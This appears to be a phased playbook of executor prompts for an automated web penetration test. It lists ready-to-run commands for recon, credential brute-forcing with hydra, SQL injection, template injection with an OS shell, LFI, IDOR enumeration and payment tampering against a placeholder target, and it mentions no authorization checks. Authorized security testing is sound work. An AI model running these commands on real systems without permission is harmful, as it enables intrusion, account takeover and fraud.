# Phase Chain — Per-Phase Executor Prompts

## Phase 1 — Recon (Parallel: osint + reconnaissance + techstack-identification)

**Objective:** Map the full attack surface before any active testing.

**Skills to load:** `skills/osint/SKILL.md`, `skills/reconnaissance/SKILL.md`, `skills/techstack-identification/SKILL.md`

**Tools & Commands:**

```bash
# Subdomain enumeration (passive)
subfinder -d TARGET_HOST -o OUTPUT_DIR/recon/subdomains-passive.txt
curl -s "https://crt.sh/?q=%.TARGET_HOST&output=json" | jq '.[].name_value' | sort -u >> OUTPUT_DIR/recon/subdomains-crt.txt
theHarvester -d TARGET_HOST -b all -f OUTPUT_DIR/recon/theharvester 2>/dev/null

# DNS resolution — filter live subdomains
cat OUTPUT_DIR/recon/subdomains-passive.txt | dnsx -silent -o OUTPUT_DIR/recon/subdomains-live.txt

# Port scan
nmap -sV -sC -T4 --open TARGET -oN OUTPUT_DIR/recon/nmap-top1000.txt
nmap -sV -p- -T4 TARGET -oN OUTPUT_DIR/recon/nmap-full.txt &

# Tech fingerprinting
whatweb TARGET -v -a 3 | tee OUTPUT_DIR/recon/whatweb.txt
wafw00f TARGET | tee OUTPUT_DIR/recon/waf.txt

# Directory enumeration
gobuster dir -u TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt,bak,zip -t 50 -o OUTPUT_DIR/recon/dirs.txt
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -mc 200,201,301,302,401,403 -o OUTPUT_DIR/recon/ffuf.json -of json

# Historical URLs
waybackurls TARGET_HOST | sort -u | tee OUTPUT_DIR/recon/wayback.txt
gau TARGET_HOST | tee OUTPUT_DIR/recon/gau.txt

# JavaScript analysis
katana -u TARGET -jc -d 5 | grep "\.js$" | tee OUTPUT_DIR/recon/js-files.txt
```

**Write to OUTPUT_DIR:**
- `recon/nmap-top1000.txt`, `recon/nmap-full.txt`
- `recon/subdomains-live.txt`, `recon/whatweb.txt`, `recon/waf.txt`
- `recon/dirs.txt`, `recon/ffuf.json`
- `recon/wayback.txt`, `recon/js-files.txt`
- `recon/tech-stack.json` (structured: `{"framework": "", "server": "", "cms": "", "waf": "", "js_libs": []}`)

**attack-chain.md update:** Services, open ports, tech stack, interesting paths, WAF status, subdomains found.

**Success criteria:** nmap complete, tech-stack.json written, at least one directory enumeration result saved.

---

## Phase 2 — Source Code Scanning (Conditional)

**Skip if:** No source repo URL or local path provided, and no `.git` directory found on target.

**Objective:** Find vulnerabilities in source before exploitation to guide later phases.

**Skills to load:** `skills/source-code-scanning/SKILL.md`

**Tools & Commands:**

```bash
# If repo URL available:
git clone --depth 1 REPO_URL OUTPUT_DIR/tools/source-code/

# Run SAST tools
semgrep --config=auto OUTPUT_DIR/tools/source-code/ --json > OUTPUT_DIR/recon/semgrep.json
bandit -r OUTPUT_DIR/tools/source-code/ -f json > OUTPUT_DIR/recon/bandit.json 2>/dev/null
trufflehog filesystem OUTPUT_DIR/tools/source-code/ --json > OUTPUT_DIR/recon/secrets.json

# Normalize findings
python3 skills/source-code-scanning/scripts/normalize.py OUTPUT_DIR/recon/semgrep.json > OUTPUT_DIR/recon/normalized.json
python3 skills/source-code-scanning/scripts/dedup.py OUTPUT_DIR/recon/normalized.json > OUTPUT_DIR/recon/deduped.json
```

**attack-chain.md update:** Source code languages, SAST finding summary, hardcoded secrets found, vulnerable code paths to target in later phases.

---

## Phase 3 — Authentication (Sequential)

**Objective:** Test all authentication mechanisms.

**Skills to load:** `skills/authentication/SKILL.md`

**Tools & Commands:**

```bash
# Login form discovery
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -mr "login|signin|auth|password" -o OUTPUT_DIR/recon/login-pages.json -of json

# Default credentials
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid" \
  -t 4 -o OUTPUT_DIR/logs/hydra-login.txt

# JWT testing — check algorithm confusion
# Extract JWT from login response, test alg:none, weak secret

# Session analysis
curl -s -c OUTPUT_DIR/tools/cookies.txt TARGET/login | grep -i "set-cookie"
```

**attack-chain.md update:** Auth mechanisms found, brute force protection status, JWT algorithm, session cookie flags, any auth bypass discovered.

---

## Phase 4 — Injection + Server-Side (Parallel)

**Objective:** Test all injection vectors and server-side vulnerabilities.

**Skills to load:** `skills/injection/SKILL.md`, `skills/server-side/SKILL.md`

**Tools & Commands:**

```bash
# SQL injection
sqlmap -u "TARGET/page?id=1" --batch --level=3 --risk=2 \
  --output-dir=OUTPUT_DIR/tools/sqlmap/ 2>&1 | tee OUTPUT_DIR/logs/sqlmap.txt

# XSS
dalfox url TARGET/search?q=test --output OUTPUT_DIR/logs/dalfox.txt

# SSRF
ssrfmap -r OUTPUT_DIR/tools/request.txt -p param_name

# SSTI
tplmap -u "TARGET/render?template=test" --os-shell

# LFI/RFI — manual payloads from config/payloads/lfi.txt
ffuf -u "TARGET/page?file=FUZZ" -w config/payloads/lfi.txt -mr "root:" -o OUTPUT_DIR/logs/lfi.json -of json

# Server-side checks
nuclei -u TARGET -t nuclei-templates/cves/ -t nuclei-templates/misconfiguration/ \
  -o OUTPUT_DIR/logs/nuclei.txt
testssl.sh TARGET | tee OUTPUT_DIR/recon/ssl.txt

# Security headers
curl -sI TARGET | grep -iE "x-frame|x-xss|content-security|strict-transport|x-content-type"
```

**attack-chain.md update:** Injectable parameters, SQLi databases accessible, XSS contexts found, SSRF targets, CVEs discovered.

---

## Phase 5 — Client-Side + API Security (Parallel)

**Objective:** Test browser-side vulnerabilities and API endpoints.

**Skills to load:** `skills/client-side/SKILL.md`, `skills/api-security/SKILL.md`

**Tools & Commands:**

```bash
# API discovery
kiterunner scan TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -o OUTPUT_DIR/recon/api-endpoints.txt
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/openapi3-path.txt \
  -mc 200 -o OUTPUT_DIR/recon/api-docs.json -of json

# GraphQL introspection
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | tee OUTPUT_DIR/logs/graphql-introspection.json

# CORS testing
curl -sI -H "Origin: https://evil.com" TARGET/api/user | grep -i "access-control"

# Clickjacking
curl -sI TARGET | grep -i "x-frame-options\|content-security-policy"

# Retire.js — vulnerable JS libraries
retire --js --path OUTPUT_DIR/recon/js-files.txt --outputformat json \
  > OUTPUT_DIR/logs/retire.json 2>/dev/null
```

**attack-chain.md update:** API endpoints discovered, BOLA/IDOR candidates, CORS misconfigs, GraphQL schema if exposed, clickjacking status.

---

## Phase 6 — Web App Logic (Sequential)

**Objective:** Test business logic flaws that automated tools miss.

**Skills to load:** `skills/web-app-logic/SKILL.md`

**Tools & Commands:**

```bash
# Price tampering — modify POST parameters
curl -s -X POST TARGET/checkout -d "price=0.01&quantity=1&item_id=100"

# IDOR — walk object IDs
for id in $(seq 1 50); do
  curl -s TARGET/api/user/$id -H "Authorization: Bearer MYTOKEN" | grep -v "Unauthorized"
done

# Race condition — parallel requests
# Use ffuf or Python threading to send simultaneous requests

# Negative value
curl -s -X POST TARGET/transfer -d "amount=-100&to_account=ATTACKER"

# Workflow bypass — skip steps
curl -s TARGET/checkout/confirm -H "Cookie: VALID_SESSION" # without completing payment
```

**attack-chain.md update:** Business logic flaws, IDOR ranges, workflow bypass paths, race condition windows.
